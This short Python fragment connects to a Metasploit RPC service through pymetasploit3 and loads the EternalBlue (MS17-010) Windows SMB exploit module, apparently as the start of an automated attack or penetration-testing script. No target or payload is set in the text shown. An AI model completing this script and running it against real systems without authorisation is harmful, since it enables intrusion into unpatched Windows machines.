from core.config import settings
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient(settings.META_PASS_STR, port=55552)

exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
